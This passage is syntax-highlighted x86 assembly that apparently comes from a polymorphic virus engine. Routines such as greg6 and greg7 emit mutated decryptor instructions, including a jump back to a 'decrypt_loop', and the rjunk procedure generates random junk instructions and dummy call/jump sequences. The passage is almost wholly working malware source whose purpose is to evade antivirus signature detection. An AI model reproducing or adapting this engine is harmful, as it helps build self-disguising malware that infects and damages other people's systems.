    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">d_next0</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">             </span><span class="sc1">;DEC reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">d_next1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;MOV EAX, random_value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;SUB reg, EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;ADD reg, random_value-1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end1</span><span class="sc0">
</span><span class="sc5">d_next2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">;XCHG EAX, reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">;DEC EAX</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;XCHG EAX, reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">greg6</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg7</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">l_next0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">             </span><span class="sc1">;PUSH ECX</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;MOV ECX, reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc0">             </span><span class="sc1">;JECXZ label</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;POP ECX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc0">                </span><span class="sc1">;JMP decrypt_loop</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">;label:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;POP ECX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eb5903e3h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">l_next</span><span class="sc0">
</span><span class="sc5">l_next0</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;XOR EAX, EAX</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;DEC EAX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">               </span><span class="sc1">;ADD EAX, reg</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;JNS decrypt_loop</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">79h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc5">l_next</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc5">Pshd</span><span class="sc0">
</span><span class="sc5">greg7</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">rjunkjc</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rjn</span><span class="sc0">
</span><span class="sc5">rjunk</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">;junk instruction generator</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">     </span><span class="sc1">;0=5, 1=1+2, 2=2+1, 3=1, 4=2, 5=3, 6=none, 7=dummy jump and call</span><span class="sc0">
</span><span class="sc5">rjn</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j5</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j_1x2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j_2x1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">r_end</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">jcj</span><span class="sc0">

</span><span class="sc5">j1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">junx1</span><span class="sc0">      </span><span class="sc1">;one byte junk instruction</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">SALC</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">junx1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">j_1x2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">j1</span><span class="sc0">         </span><span class="sc1">;one byte and two byte</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">j2</span><span class="sc0">
</span><span class="sc5">j_2x1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">j2</span><span class="sc0">         </span><span class="sc1">;two byte and one byte</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">j1</span><span class="sc0">
</span><span class="sc5">j3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">junx3</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">  </span><span class="sc1">;rol eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc0">  </span><span class="sc1">;shl eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc0">  </span><span class="sc1">;ror eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">  </span><span class="sc1">;shr eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc0">  </span><span class="sc1">;rcl eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">  </span><span class="sc1">;sar eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc0">  </span><span class="sc1">;rcr eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">  </span><span class="sc1">;cmp eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">  </span><span class="sc1">;clc; jc ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0f9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc0">  </span><span class="sc1">;stc; jnc ...</span><span class="sc0">

</span><span class="sc5">junx3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;three byte junk instruction</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">r_ran</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">r_ran</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">j2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">junx2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8bh</span><span class="sc0">     </span><span class="sc1">;mov eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">     </span><span class="sc1">;add eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13h</span><span class="sc0">     </span><span class="sc1">;adc eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2bh</span><span class="sc0">     </span><span class="sc1">;sub eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1bh</span><span class="sc0">     </span><span class="sc1">;sbb eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bh</span><span class="sc0">     </span><span class="sc1">;or eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0">     </span><span class="sc1">;xor eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">23h</span><span class="sc0">     </span><span class="sc1">;and eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0">     </span><span class="sc1">;test eax, ...</span><span class="sc0">

</span><span class="sc5">junx2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;two byte junk instruction</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">r_end</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">j5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">junx5</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">        </span><span class="sc1">;mov eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05h</span><span class="sc0">     </span><span class="sc1">;add eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">15h</span><span class="sc0">     </span><span class="sc1">;adc eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2dh</span><span class="sc0">     </span><span class="sc1">;sub eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1dh</span><span class="sc0">     </span><span class="sc1">;sbb eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc0">     </span><span class="sc1">;or eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">35h</span><span class="sc0">     </span><span class="sc1">;xor eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">25h</span><span class="sc0">     </span><span class="sc1">;and eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0a9h</span><span class="sc0">        </span><span class="sc1">;test eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3dh</span><span class="sc0">     </span><span class="sc1">;cmp eax, ...</span><span class="sc0">

</span><span class="sc5">junx5</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;five byte junk instruction</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">jcj</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">        </span><span class="sc1">;junk</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;CALL label1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">;junk</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">;JMP label2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">        </span><span class="sc1">;junk</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">;label1: junk</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;RET</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">           </span><span class="sc1">;junk</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;label2:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">        </span><span class="sc1">;junk</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">rjunk</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
